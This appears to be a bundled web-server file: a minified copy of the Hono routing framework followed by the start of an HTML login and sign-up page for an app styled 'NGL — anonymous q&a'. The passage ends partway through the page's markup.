var e=(e,t,n)=>(r,i)=>{let a=-1;return o(0);async function o(s){if(s<=a)throw Error(`next() called multiple times`);a=s;let c,l=!1,u;if(e[s]?(u=e[s][0][0],r.req.routeIndex=s):u=s===e.length&&i||void 0,u)try{c=await u(r,()=>o(s+1))}catch(e){if(e instanceof Error&&t)r.error=e,c=await t(e,r),l=!0;else throw e}else r.finalized===!1&&n&&(c=await n(r));return c&&(r.finalized===!1||l)&&(r.res=c),r}},t=Symbol(),n=(e,t)=>new Response(e,{headers:{"Content-Type":t.replace(/^[^;]+/,e=>e.toLowerCase())}}).formData(),r=e=>`headers`in e,i=async(e,t=Object.create(null))=>{let{all:n=!1,dot:i=!1}=t,o=(r(e)?e.headers:e.raw.headers).get(`Content-Type`)?.split(`;`)[0].trim().toLowerCase();return o===`multipart/form-data`||o===`application/x-www-form-urlencoded`?a(e,{all:n,dot:i}):{}};async function a(e,t){if(!r(e)&&e.bodyCache.formData)return o(await e.bodyCache.formData,t);let i=r(e)?e.headers:e.raw.headers,a=n(await e.arrayBuffer(),i.get(`Content-Type`)||``);r(e)||(e.bodyCache.formData=a);let s=await a;return s?o(s,t):{}}function o(e,t){let n=Object.create(null);return e.forEach((e,r)=>{t.all||r.endsWith(`[]`)?s(n,r,e):n[r]=e}),t.dot&&Object.entries(n).forEach(([e,t])=>{e.includes(`.`)&&(c(n,e,t),delete n[e])}),n}var s=(e,t,n)=>{e[t]===void 0?e[t]=t.endsWith(`[]`)?[n]:n:Array.isArray(e[t])?e[t].push(n):e[t]=[e[t],n]},c=(e,t,n)=>{if(/(?:^|\.)__proto__\./.test(t))return;let r=e,i=t.split(`.`);i.forEach((e,t)=>{t===i.length-1?r[e]=n:((!r[e]||typeof r[e]!=`object`||Array.isArray(r[e])||r[e]instanceof File)&&(r[e]=Object.create(null)),r=r[e])})},l=e=>{let t=e.split(`/`);return t[0]===``&&t.shift(),t},u=e=>{let{groups:t,path:n}=d(e);return f(l(n),t)},d=e=>{let t=[];return e=e.replace(/\{[^}]+\}/g,(e,n)=>{let r=`@${n}`;return t.push([r,e]),r}),{groups:t,path:e}},f=(e,t)=>{for(let n=t.length-1;n>=0;n--){let[r]=t[n];for(let i=e.length-1;i>=0;i--)if(e[i].includes(r)){e[i]=e[i].replace(r,t[n][1]);break}}return e},p={},m=(e,t)=>{if(e===`*`)return`*`;let n=e.match(/^\:([^\{\}]+)(?:\{(.+)\})?$/);if(n){let r=`${e}#${t}`;return p[r]||(p[r]=n[2]?t&&t[0]!==`:`&&t[0]!==`*`?[r,n[1],RegExp(`^${n[2]}(?=/${t})`)]:[e,n[1],RegExp(`^${n[2]}$`)]:[e,n[1],!0]),p[r]}return null},h=(e,t)=>{try{return t(e)}catch{return e.replace(/(?:%[0-9A-Fa-f]{2})+/g,e=>{try{return t(e)}catch{return e}})}},g=e=>h(e,decodeURI),_=e=>{let t=e.url,n=t.indexOf(`/`,t.indexOf(`:`)+4),r=n;for(;r<t.length;r++){let e=t.charCodeAt(r);if(e===37){let e=t.indexOf(`?`,r),i=t.indexOf(`#`,r),a=e===-1?i===-1?void 0:i:i===-1?e:Math.min(e,i),o=t.slice(n,a);return g(o.includes(`%25`)?o.replace(/%25/g,`%2525`):o)}if(e===63||e===35)break}return t.slice(n,r)},v=e=>{let t=_(e);return t.length>1&&t.at(-1)===`/`?t.slice(0,-1):t},y=(e,t,...n)=>(n.length&&(t=y(t,...n)),`${e?.[0]===`/`?``:`/`}${e}${t===`/`?``:`${e?.at(-1)===`/`?``:`/`}${t?.[0]===`/`?t.slice(1):t}`}`),b=e=>{if(e.charCodeAt(e.length-1)!==63||!e.includes(`:`))return null;let t=e.split(`/`),n=[],r=``;return t.forEach(e=>{if(e!==``&&!/\:/.test(e))r+=`/`+e;else if(/\:/.test(e))if(/\?/.test(e)){n.length===0&&r===``?n.push(`/`):n.push(r);let t=e.replace(`?`,``);r+=`/`+t,n.push(r)}else r+=`/`+e}),n.filter((e,t,n)=>n.indexOf(e)===t)},x=e=>/[%+]/.test(e)?(e.indexOf(`+`)!==-1&&(e=e.replace(/\+/g,` `)),e.indexOf(`%`)===-1?e:h(e,C)):e,S=(e,t,n)=>{let r;if(!n&&t&&!/[%+]/.test(t)){let n=e.indexOf(`?`,8);if(n===-1)return;for(e.startsWith(t,n+1)||(n=e.indexOf(`&${t}`,n+1));n!==-1;){let r=e.charCodeAt(n+t.length+1);if(r===61){let r=n+t.length+2,i=e.indexOf(`&`,r);return x(e.slice(r,i===-1?void 0:i))}if(r==38||isNaN(r))return``;n=e.indexOf(`&${t}`,n+1)}if(r=/[%+]/.test(e),!r)return}let i=Object.create(null);r??=/[%+]/.test(e);let a=e.indexOf(`?`,8);for(;a!==-1;){let t=e.indexOf(`&`,a+1),o=e.indexOf(`=`,a);o>t&&t!==-1&&(o=-1);let s=e.slice(a+1,o===-1?t===-1?void 0:t:o);if(r&&(s=x(s)),a=t,s===``)continue;let c;o===-1?c=``:(c=e.slice(o+1,t===-1?void 0:t),r&&(c=x(c))),n?(i[s]&&Array.isArray(i[s])||(i[s]=[]),i[s].push(c)):i[s]??=c}return t?i[t]:i},ee=S,te=(e,t)=>S(e,t,!0),C=decodeURIComponent,w=e=>h(e,C),ne=class{raw;#e;#t;routeIndex=0;path;bodyCache={};constructor(e,t=`/`,n=[[]]){this.raw=e,this.path=t,this.#t=n,this.#e={}}param(e){return e?this.#n(e):this.#r()}#n(e){let t=this.#t[0][this.routeIndex][1][e],n=this.#i(t);return n&&/\%/.test(n)?w(n):n}#r(){let e={},t=Object.keys(this.#t[0][this.routeIndex][1]);for(let n of t){let t=this.#i(this.#t[0][this.routeIndex][1][n]);t!==void 0&&(e[n]=/\%/.test(t)?w(t):t)}return e}#i(e){return this.#t[1]?this.#t[1][e]:e}query(e){return ee(this.url,e)}queries(e){return te(this.url,e)}header(e){if(e)return this.raw.headers.get(e)??void 0;let t=Object.create(null);return this.raw.headers.forEach((e,n)=>{t[n]=e}),t}async parseBody(e){return i(this,e)}#a=e=>{let{bodyCache:t,raw:n}=this,r=t[e];if(r)return r;let i=Object.keys(t)[0];return i?t[i].then(t=>(i===`json`&&(t=JSON.stringify(t)),new Response(t)[e]())):t[e]=n[e]()};json(){return this.#a(`text`).then(e=>JSON.parse(e))}text(){return this.#a(`text`)}arrayBuffer(){return this.#a(`arrayBuffer`)}bytes(){return this.#a(`arrayBuffer`).then(e=>new Uint8Array(e))}blob(){return this.#a(`blob`)}formData(){return this.#a(`formData`)}addValidatedData(e,t){this.#e[e]=t}valid(e){return this.#e[e]}get url(){return this.raw.url}get method(){return this.raw.method}get[t](){return this.#t}get matchedRoutes(){return this.#t[0].map(([[,e]])=>e)}get routePath(){return this.#t[0].map(([[,e]])=>e)[this.routeIndex].path}},re={Stringify:1,BeforeStream:2,Stream:3},ie=(e,t)=>{let n=new String(e);return n.isEscaped=!0,n.callbacks=t,n},T=async(e,t,n,r,i)=>{typeof e==`object`&&!(e instanceof String)&&(e instanceof Promise||(e=e.toString()),e instanceof Promise&&(e=await e));let a=e.callbacks;if(!a?.length)return Promise.resolve(e);i?i[0]+=e:i=[e];let o=Promise.all(a.map(e=>e({phase:t,buffer:i,context:r}))).then(e=>Promise.all(e.filter(Boolean).map(e=>T(e,t,!1,r,i))).then(()=>i[0]));return n?ie(await o,a):o},ae=`text/plain; charset=UTF-8`,E=(e,t)=>({"Content-Type":e,...t}),D=(e,t)=>new Response(e,t),oe=class{#e;#t;env={};#n;finalized=!1;error;#r;#i;#a;#o;#s;#c;#l;#u;#d;constructor(e,t){this.#e=e,t&&(this.#i=t.executionCtx,this.env=t.env,this.#c=t.notFoundHandler,this.#d=t.path,this.#u=t.matchResult)}get req(){return this.#t??=new ne(this.#e,this.#d,this.#u),this.#t}get event(){if(this.#i&&`respondWith`in this.#i)return this.#i;throw Error(`This context has no FetchEvent`)}get executionCtx(){if(this.#i)return this.#i;throw Error(`This context has no ExecutionContext`)}get res(){return this.#a||=D(null,{headers:this.#l??=new Headers})}set res(e){if(this.#a&&e){e=D(e.body,e);for(let[t,n]of this.#a.headers.entries())if(t!==`content-type`)if(t===`set-cookie`){let t=this.#a.headers.getSetCookie();e.headers.delete(`set-cookie`);for(let n of t)e.headers.append(`set-cookie`,n)}else e.headers.set(t,n)}this.#a=e,this.finalized=!0}render=(...e)=>(this.#s??=e=>this.html(e),this.#s(...e));setLayout=e=>this.#o=e;getLayout=()=>this.#o;setRenderer=e=>{this.#s=e};header=(e,t,n)=>{this.finalized&&(this.#a=D(this.#a.body,this.#a));let r=this.#a?this.#a.headers:this.#l??=new Headers;t===void 0?r.delete(e):n?.append?r.append(e,t):r.set(e,t)};status=e=>{this.#r=e};set=(e,t)=>{this.#n??=new Map,this.#n.set(e,t)};get=e=>this.#n?this.#n.get(e):void 0;get var(){return this.#n?Object.fromEntries(this.#n):{}}#f(e,t,n){let r=this.#a?new Headers(this.#a.headers):this.#l??new Headers;if(typeof t==`object`&&`headers`in t){let e=t.headers instanceof Headers?t.headers:new Headers(t.headers);for(let[t,n]of e)t.toLowerCase()===`set-cookie`?r.append(t,n):r.set(t,n)}if(n)for(let[e,t]of Object.entries(n))if(typeof t==`string`)r.set(e,t);else{r.delete(e);for(let n of t)r.append(e,n)}return D(e,{status:typeof t==`number`?t:t?.status??this.#r,headers:r})}newResponse=(...e)=>this.#f(...e);body=(e,t,n)=>this.#f(e,t,n);text=(e,t,n)=>!this.#l&&!this.#r&&!t&&!n&&!this.finalized?new Response(e):this.#f(e,t,E(ae,n));json=(e,t,n)=>this.#f(JSON.stringify(e),t,E(`application/json`,n));html=(e,t,n)=>{let r=e=>this.#f(e,t,E(`text/html; charset=UTF-8`,n));return typeof e==`object`?T(e,re.Stringify,!1,{}).then(r):r(e)};redirect=(e,t)=>{let n=String(e);return this.header(`Location`,/[^\x00-\xFF]/.test(n)?encodeURI(n):n),this.newResponse(null,t??302)};notFound=()=>(this.#c??=()=>D(),this.#c(this))},se=[`get`,`post`,`put`,`delete`,`options`,`patch`],O=`Can not add a route since the matcher is already built.`,k=class extends Error{},ce=`__COMPOSED_HANDLER`,le=e=>e.text(`404 Not Found`,404),A=(e,t)=>{if(`getResponse`in e){let n=e.getResponse();return t.newResponse(n.body,n)}return console.error(e),t.text(`Internal Server Error`,500)},ue=class t{get;post;put;delete;options;patch;all;on;use;router;getPath;_basePath=`/`;#e=`/`;routes=[];constructor(e={}){[...se,`all`].forEach(e=>{this[e]=(t,...n)=>(typeof t==`string`?this.#e=t:this.#r(e,this.#e,t),n.forEach(t=>{this.#r(e,this.#e,t)}),this)}),this.on=(e,t,...n)=>{for(let r of[t].flat()){this.#e=r;for(let t of[e].flat())n.map(e=>{this.#r(t.toUpperCase(),this.#e,e)})}return this},this.use=(e,...t)=>(typeof e==`string`?this.#e=e:(this.#e=`*`,t.unshift(e)),t.forEach(e=>{this.#r(`ALL`,this.#e,e)}),this);let{strict:t,...n}=e;Object.assign(this,n),this.getPath=t??!0?e.getPath??_:v}#t(){let e=new t({router:this.router,getPath:this.getPath});return e.errorHandler=this.errorHandler,e.#n=this.#n,e.routes=this.routes,e}#n=le;errorHandler=A;route(t,n){let r=this.basePath(t);return n.routes.map(t=>{let i;n.errorHandler===A?i=t.handler:(i=async(r,i)=>(await e([],n.errorHandler)(r,()=>t.handler(r,i))).res,i[ce]=t.handler),r.#r(t.method,t.path,i,t.basePath)}),this}basePath(e){let t=this.#t();return t._basePath=y(this._basePath,e),t}onError=e=>(this.errorHandler=e,this);notFound=e=>(this.#n=e,this);mount(e,t,n){let r,i;n&&(typeof n==`function`?i=n:(i=n.optionHandler,r=n.replaceRequest===!1?e=>e:n.replaceRequest));let a=i?e=>{let t=i(e);return Array.isArray(t)?t:[t]}:e=>{let t;try{t=e.executionCtx}catch{}return[e.env,t]};return r||=(()=>{let t=y(this._basePath,e),n=t===`/`?0:t.length;return e=>{let t=new URL(e.url);return t.pathname=this.getPath(e).slice(n)||`/`,new Request(t,e)}})(),this.#r(`ALL`,y(e,`*`),async(e,n)=>{let i=await t(r(e.req.raw),...a(e));if(i)return i;await n()}),this}#r(e,t,n,r){e=e.toUpperCase(),t=y(this._basePath,t);let i={basePath:r===void 0?this._basePath:y(this._basePath,r),path:t,method:e,handler:n};this.router.add(e,t,[n,i]),this.routes.push(i)}#i(e,t){if(e instanceof Error)return this.errorHandler(e,t);throw e}#a(t,n,r,i){if(i===`HEAD`)return(async()=>new Response(null,await this.#a(t,n,r,`GET`)))();let a=this.getPath(t,{env:r}),o=this.router.match(i,a),s=new oe(t,{path:a,matchResult:o,env:r,executionCtx:n,notFoundHandler:this.#n});if(o[0].length===1){let e;try{e=o[0][0][0][0](s,async()=>{s.res=await this.#n(s)})}catch(e){return this.#i(e,s)}return e instanceof Promise?e.then(e=>e||(s.finalized?s.res:this.#n(s))).catch(e=>this.#i(e,s)):e??this.#n(s)}let c=e(o[0],this.errorHandler,this.#n);return(async()=>{try{let e=await c(s);if(!e.finalized)throw Error("Context is not finalized. Did you forget to return a Response object or `await next()`?");return e.res}catch(e){return this.#i(e,s)}})()}fetch=(e,...t)=>this.#a(e,t[1],t[0],e.method);request=(e,t,n,r)=>e instanceof Request?this.fetch(t?new Request(e,t):e,n,r):(e=e.toString(),this.fetch(new Request(/^https?:\/\//.test(e)?e:`http://localhost${y(`/`,e)}`,t),n,r));fire=()=>{addEventListener(`fetch`,e=>{e.respondWith(this.#a(e.request,e,void 0,e.request.method))})}},j=[];function de(e,t){let n=this.buildAllMatchers(),r=((e,t)=>{let r=n[e]||n.ALL,i=r[2][t];if(i)return i;let a=t.match(r[0]);if(!a)return[[],j];let o=a.indexOf(``,1);return[r[1][o],a]});return this.match=r,r(e,t)}var M=`[^/]+`,N=`.*`,P=`(?:|/.*)`,F=Symbol(),fe=new Set(`.\\+*[^]$()`);function pe(e,t){return e.length===1?t.length===1?e<t?-1:1:-1:t.length===1||e===N||e===P?1:t===N||t===P?-1:e===M?1:t===M?-1:e.length===t.length?e<t?-1:1:t.length-e.length}var me=class e{#e;#t;#n=Object.create(null);insert(t,n,r,i,a){if(t.length===0){if(this.#e!==void 0)throw F;if(a)return;this.#e=n;return}let[o,...s]=t,c=o===`*`?s.length===0?[``,``,N]:[``,``,M]:o===`/*`?[``,``,P]:o.match(/^\:([^\{\}]+)(?:\{(.+)\})?$/),l;if(c){let t=c[1],n=c[2]||M;if(t&&c[2]&&(n===`.*`||(n=n.replace(/^\((?!\?:)(?=[^)]+\)$)/,`(?:`),/\((?!\?:)/.test(n))))throw F;if(l=this.#n[n],!l){if(Object.keys(this.#n).some(e=>e!==N&&e!==P))throw F;if(a)return;l=this.#n[n]=new e,t!==``&&(l.#t=i.varIndex++)}!a&&t!==``&&r.push([t,l.#t])}else if(l=this.#n[o],!l){if(Object.keys(this.#n).some(e=>e.length>1&&e!==N&&e!==P))throw F;if(a)return;l=this.#n[o]=new e}l.insert(s,n,r,i,a)}buildRegExpStr(){let e=Object.keys(this.#n).sort(pe).map(e=>{let t=this.#n[e];return(typeof t.#t==`number`?`(${e})@${t.#t}`:fe.has(e)?`\\${e}`:e)+t.buildRegExpStr()});return typeof this.#e==`number`&&e.unshift(`#${this.#e}`),e.length===0?``:e.length===1?e[0]:`(?:`+e.join(`|`)+`)`}},he=class{#e={varIndex:0};#t=new me;insert(e,t,n){let r=[],i=[];for(let t=0;;){let n=!1;if(e=e.replace(/\{[^}]+\}/g,e=>{let r=`@\\${t}`;return i[t]=[r,e],t++,n=!0,r}),!n)break}let a=e.match(/(?::[^\/]+)|(?:\/\*$)|./g)||[];for(let e=i.length-1;e>=0;e--){let[t]=i[e];for(let n=a.length-1;n>=0;n--)if(a[n].indexOf(t)!==-1){a[n]=a[n].replace(t,i[e][1]);break}}return this.#t.insert(a,t,r,this.#e,n),r}buildRegExp(){let e=this.#t.buildRegExpStr();if(e===``)return[/^$/,[],[]];let t=0,n=[],r=[];return e=e.replace(/#(\d+)|@(\d+)|\.\*\$/g,(e,i,a)=>i===void 0?(a===void 0||(r[Number(a)]=++t),``):(n[++t]=Number(i),`$()`)),[RegExp(`^${e}`),n,r]}},ge=[/^$/,[],Object.create(null)],I=Object.create(null);function L(e){return I[e]??=RegExp(e===`*`?``:`^${e.replace(/\/\*$|([.\\+*[^\]$()])/g,(e,t)=>t?`\\${t}`:`(?:|/.*)`)}$`)}function _e(){I=Object.create(null)}function ve(e){let t=new he,n=[];if(e.length===0)return ge;let r=e.map(e=>[!/\*|\/:/.test(e[0]),...e]).sort(([e,t],[n,r])=>e?1:n?-1:t.length-r.length),i=Object.create(null);for(let e=0,a=-1,o=r.length;e<o;e++){let[o,s,c]=r[e];o?i[s]=[c.map(([e])=>[e,Object.create(null)]),j]:a++;let l;try{l=t.insert(s,a,o)}catch(e){throw e===F?new k(s):e}o||(n[a]=c.map(([e,t])=>{let n=Object.create(null);for(--t;t>=0;t--){let[e,r]=l[t];n[e]=r}return[e,n]}))}let[a,o,s]=t.buildRegExp();for(let e=0,t=n.length;e<t;e++)for(let t=0,r=n[e].length;t<r;t++){let r=n[e][t]?.[1];if(!r)continue;let i=Object.keys(r);for(let e=0,t=i.length;e<t;e++)r[i[e]]=s[r[i[e]]]}let c=[];for(let e in o)c[e]=n[o[e]];return[a,c,i]}function R(e,t){if(e){for(let n of Object.keys(e).sort((e,t)=>t.length-e.length))if(L(n).test(t))return[...e[n]]}}var ye=class{name=`RegExpRouter`;#e;#t;constructor(){this.#e={ALL:Object.create(null)},this.#t={ALL:Object.create(null)}}add(e,t,n){let r=this.#e,i=this.#t;if(!r||!i)throw Error(O);r[e]||[r,i].forEach(t=>{t[e]=Object.create(null),Object.keys(t.ALL).forEach(n=>{t[e][n]=[...t.ALL[n]]})}),t===`/*`&&(t=`*`);let a=(t.match(/\/:/g)||[]).length;if(/\*$/.test(t)){let o=L(t);e===`ALL`?Object.keys(r).forEach(e=>{r[e][t]||=R(r[e],t)||R(r.ALL,t)||[]}):r[e][t]||=R(r[e],t)||R(r.ALL,t)||[],Object.keys(r).forEach(t=>{(e===`ALL`||e===t)&&Object.keys(r[t]).forEach(e=>{o.test(e)&&r[t][e].push([n,a])})}),Object.keys(i).forEach(t=>{(e===`ALL`||e===t)&&Object.keys(i[t]).forEach(e=>o.test(e)&&i[t][e].push([n,a]))});return}let o=b(t)||[t];for(let t=0,s=o.length;t<s;t++){let c=o[t];Object.keys(i).forEach(o=>{(e===`ALL`||e===o)&&(i[o][c]||=[...R(r[o],c)||R(r.ALL,c)||[]],i[o][c].push([n,a-s+t+1]))})}}match=de;buildAllMatchers(){let e=Object.create(null);return Object.keys(this.#t).concat(Object.keys(this.#e)).forEach(t=>{e[t]||=this.#n(t)}),this.#e=this.#t=void 0,_e(),e}#n(e){let t=[],n=e===`ALL`;return[this.#e,this.#t].forEach(r=>{let i=r[e]?Object.keys(r[e]).map(t=>[t,r[e][t]]):[];i.length===0?e!==`ALL`&&t.push(...Object.keys(r.ALL).map(e=>[e,r.ALL[e]])):(n||=!0,t.push(...i))}),n?ve(t):null}},be=class{name=`SmartRouter`;#e=[];#t=[];constructor(e){this.#e=e.routers}add(e,t,n){if(!this.#t)throw Error(O);this.#t.push([e,t,n])}match(e,t){if(!this.#t)throw Error(`Fatal error`);let n=this.#e,r=this.#t,i=n.length,a=0,o;for(;a<i;a++){let i=n[a];try{for(let e=0,t=r.length;e<t;e++)i.add(...r[e]);o=i.match(e,t)}catch(e){if(e instanceof k)continue;throw e}this.match=i.match.bind(i),this.#e=[i],this.#t=void 0;break}if(a===i)throw Error(`Fatal error`);return this.name=`SmartRouter + ${this.activeRouter.name}`,o}get activeRouter(){if(this.#t||this.#e.length!==1)throw Error(`No active router has been determined yet.`);return this.#e[0]}},z=Object.create(null),xe=e=>{for(let t in e)return!0;return!1},Se=class e{#e;#t;#n;#r=0;#i=z;constructor(e,t,n){if(this.#t=n||Object.create(null),this.#e=[],e&&t){let n=Object.create(null);n[e]={handler:t,possibleKeys:[],score:0},this.#e=[n]}this.#n=[]}insert(t,n,r){this.#r=++this.#r;let i=this,a=u(n),o=[];for(let t=0,n=a.length;t<n;t++){let n=a[t],r=a[t+1],s=m(n,r),c=Array.isArray(s)?s[0]:n;if(c in i.#t){i=i.#t[c],s&&o.push(s[1]);continue}i.#t[c]=new e,s&&(i.#n.push(s),o.push(s[1])),i=i.#t[c]}return i.#e.push({[t]:{handler:r,possibleKeys:o.filter((e,t,n)=>n.indexOf(e)===t),score:this.#r}}),i}#a(e,t,n,r,i){for(let a=0,o=t.#e.length;a<o;a++){let o=t.#e[a],s=o[n]||o.ALL,c={};if(s!==void 0&&(s.params=Object.create(null),e.push(s),r!==z||i&&i!==z))for(let e=0,t=s.possibleKeys.length;e<t;e++){let t=s.possibleKeys[e],n=c[s.score];s.params[t]=i?.[t]&&!n?i[t]:r[t]??i?.[t],c[s.score]=!0}}}search(e,t){let n=[];this.#i=z;let r=[this],i=l(t),a=[],o=i.length,s=null;for(let c=0;c<o;c++){let l=i[c],u=c===o-1,d=[];for(let f=0,p=r.length;f<p;f++){let p=r[f],m=p.#t[l];m&&(m.#i=p.#i,u?(m.#t[`*`]&&this.#a(n,m.#t[`*`],e,p.#i),this.#a(n,m,e,p.#i)):d.push(m));for(let r=0,f=p.#n.length;r<f;r++){let f=p.#n[r],m=p.#i===z?{}:{...p.#i};if(f===`*`){let t=p.#t[`*`];t&&(this.#a(n,t,e,p.#i),t.#i=m,d.push(t));continue}let[h,g,_]=f;if(!l&&!(_ instanceof RegExp))continue;let v=p.#t[h];if(_ instanceof RegExp){if(s===null){s=Array(o);let e=+(t[0]===`/`);for(let t=0;t<o;t++)s[t]=e,e+=i[t].length+1}let r=t.substring(s[c]),l=_.exec(r);if(l){if(m[g]=l[0],this.#a(n,v,e,p.#i,m),l[0].length===r.length&&v.#t[`*`]&&this.#a(n,v.#t[`*`],e,p.#i,m),xe(v.#t)){v.#i=m;let e=l[0].match(/\//)?.length??0;(a[e]||=[]).push(v)}continue}}(_===!0||_.test(l))&&(m[g]=l,u?(this.#a(n,v,e,m,p.#i),v.#t[`*`]&&this.#a(n,v.#t[`*`],e,m,p.#i)):(v.#i=m,d.push(v)))}}let f=a.shift();r=f?d.concat(f):d}return n.length>1&&n.sort((e,t)=>e.score-t.score),[n.map(({handler:e,params:t})=>[e,t])]}},Ce=class{name=`TrieRouter`;#e;constructor(){this.#e=new Se}add(e,t,n){let r=b(t);if(r){for(let t=0,i=r.length;t<i;t++)this.#e.insert(e,r[t],n);return}this.#e.insert(e,t,n)}match(e,t){return this.#e.search(e,t)}},B=class extends ue{constructor(e={}){super(e),this.router=e.router??new be({routers:[new ye,new Ce]})}},we=/^[\w!#$%&'*.^`|~+-]+$/,Te=/^[!#-:<>-[\]-~]+$/,Ee=/^[ !#-:<-[\]-~]*$/,V=e=>{let t=0,n=e.length;for(;t<n;){let n=e.charCodeAt(t);if(n!==32&&n!==9)break;t++}for(;n>t;){let t=e.charCodeAt(n-1);if(t!==32&&t!==9)break;n--}return t===0&&n===e.length?e:e.slice(t,n)},H=(e,t)=>{if(t&&e.indexOf(t)===-1)return{};let n=e.split(`;`),r=Object.create(null);for(let e of n){let n=e.indexOf(`=`);if(n===-1)continue;let i=V(e.substring(0,n));if(t&&t!==i||!Te.test(i)||i in r)continue;let a=V(e.substring(n+1));if(a.startsWith(`"`)&&a.endsWith(`"`)&&(a=a.slice(1,-1)),Ee.test(a)&&(r[i]=a.indexOf(`%`)===-1?a:h(a,C),t))break}return r},De=(e,t,n={})=>{if(!we.test(e))throw Error(`Invalid cookie name`);let r=`${e}=${t}`;if(e.startsWith(`__Secure-`)&&!n.secure)throw Error(`__Secure- Cookie must have Secure attributes`);if(e.startsWith(`__Host-`)){if(!n.secure)throw Error(`__Host- Cookie must have Secure attributes`);if(n.path!==`/`)throw Error(`__Host- Cookie must have Path attributes with "/"`);if(n.domain)throw Error(`__Host- Cookie must not have Domain attributes`)}for(let e of[`domain`,`path`,`sameSite`,`priority`])if(n[e]&&/[;\r\n]/.test(n[e]))throw Error(`${e} must not contain ";", "\\r", or "\\n"`);if(n&&typeof n.maxAge==`number`&&n.maxAge>=0){if(n.maxAge>3456e4)throw Error(`Cookies Max-Age SHOULD NOT be greater than 400 days (34560000 seconds) in duration.`);r+=`; Max-Age=${n.maxAge|0}`}if(n.domain&&n.prefix!==`host`&&(r+=`; Domain=${n.domain}`),n.path&&(r+=`; Path=${n.path}`),n.expires){if(n.expires.getTime()-Date.now()>3456e7)throw Error(`Cookies Expires SHOULD NOT be greater than 400 days (34560000 seconds) in the future.`);r+=`; Expires=${n.expires.toUTCString()}`}if(n.httpOnly&&(r+=`; HttpOnly`),n.secure&&(r+=`; Secure`),n.sameSite&&(r+=`; SameSite=${n.sameSite.charAt(0).toUpperCase()+n.sameSite.slice(1)}`),n.priority&&(r+=`; Priority=${n.priority.charAt(0).toUpperCase()+n.priority.slice(1)}`),n.partitioned){if(!n.secure)throw Error(`Partitioned Cookie must have Secure attributes`);r+=`; Partitioned`}return r},U=(e,t,n)=>(t=encodeURIComponent(t),De(e,t,n)),W=(e,t,n)=>{let r=e.req.raw.headers.get(`Cookie`);if(typeof t==`string`){if(!r)return;let e=t;return n===`secure`?e=`__Secure-`+t:n===`host`&&(e=`__Host-`+t),H(r,e)[e]}return r?H(r):{}},Oe=(e,t,n)=>{let r;return r=n?.prefix===`secure`?U(`__Secure-`+e,t,{path:`/`,...n,secure:!0}):n?.prefix===`host`?U(`__Host-`+e,t,{...n,path:`/`,secure:!0,domain:void 0}):U(e,t,{path:`/`,...n}),r},G=(e,t,n,r)=>{let i=Oe(t,n,r);e.header(`Set-Cookie`,i,{append:!0})},ke=(e,t,n)=>{let r=W(e,t,n?.prefix);return G(e,t,``,{...n,maxAge:0}),r};function Ae(){return`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>NGL — anonymous q&a</title>
<link rel="icon" href="/static/logo.png">
<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
<style>
  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
  body {
    font-family:'Nunito',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
    min-height:100vh;
    background:linear-gradient(150deg,#d81b60 0%,#f5334f 40%,#ff7a00 100%);
    display:flex; align-items:center; justify-content:center;
    padding:20px; color:#fff;
  }
  .wrap { width:100%; max-width:400px; text-align:center; }
  .logo { width:110px; height:110px; border-radius:26px; box-shadow:0 10px 30px rgba(0,0,0,.25); margin-bottom:22px; }
  .card {
    background:#fff; border-radius:26px; padding:28px 24px;
    box-shadow:0 16px 40px rgba(0,0,0,.18); color:#111;
  }
  h1 { font-size:22px; font-weight:900; margin-bottom:4px; color:#111; }
  .sub { color:#8a8a8a; font-size:14px; margin-bottom:22px; font-weight:600; }
  .tabs { display:flex; background:#f1f1f3; border-radius:14px; padding:5px; margin-bottom:20px; }
  .tabs button {
    flex:1; border:none; background:transparent; padding:11px; border-radius:10px;
    font-family:inherit; font-weight:800; font-size:15px; color:#8a8a8a; cursor:pointer; transition:.15s;
  }
  .tabs button.active { background:#fff; color:#111; box-shadow:0 2px 6px rgba(0,0,0,.08); }
  .field { text-align:left; margin-bottom:14px; }
  .field label { font-size:13px; font-weight:800; color:#555; display:block; margin-bottom:6px; margin-left:4px; }
  .field input {
    width:100%; padding:15px 16px; border:2px solid #ededed; border-radius:14px;
    font-family:inherit; font-size:16px; font-weight:600; background:#fafafa; outline:none; transition:.15s;
  }
  .field input:focus { border-color:#ff5e00; background:#fff; }
  .pw-wrap { position:relative; }
  .pw-wrap input { padding-right:48px; }
  .pw-toggle { position:absolute; top:50%; right:12px; transform:translateY(-50%); width:30px; height:30px; border:none; background:transparent; cursor:pointer; display:flex; align-items:center; justify-content:center; padding:0; color:#8a8a8a; }
  .pw-toggle svg { width:22px; height:22px; }
  .btn {
    width:100%; padding:16px; border:none; border-radius:30px; background:#000; color:#fff;
    font-family:inherit; font-weight:900; font-size:17px; cursor:pointer; margin-top:6px; transition:transform .1s;
  }
  .btn:active { transform:scale(.98); }
  .btn:disabled { opacity:.6; }
  .err { color:#f5334f; font-size:13px; font-weight:700; margin-top:12px; min-height:16px; }
  .foot { margin-top:20px; font-size:12px; font-weight:700; color:rgba(255,255,255,.85); }
</style>
</head>
<body>
  <div class="wrap">
    <img src="/static/logo.png" class="logo" alt="NGL">
    <div class="card">
      <h1 id="title">welcome back</h1>
      <div class="sub">🔒 anonymous q&a</div>
      <div class="tabs">
        <button id="tab-login" class="active" onclick="switchTab('login')">Log in</button>
        <button id="tab-signup" onclick="switchTab('signup')">Sign up</button>
      </div>
      <form id="authForm" onsubmit="submitAuth(event)">
        <div class="field">
          <label>Username</label>
          <input id="username" autocomplete="username" placeholder="your username" required>
        </div>
        <div class="field">
          <label>Password</label>
          <div class="pw-wrap">
            <input id="password" type="password" autocomplete="current-password" placeholder="••••••••" required>
            <button type="button" class="pw-toggle" id="pwToggle" aria-label="Show password" onclick="togglePassword()">
              <!-- eye (visible) icon -->
              <svg id="eyeOpen" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                <circle cx="12" cy="12" r="3"/>
              </svg>
              <!-- eye-off (hidden) icon -->
              <svg id="eyeOff" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none">
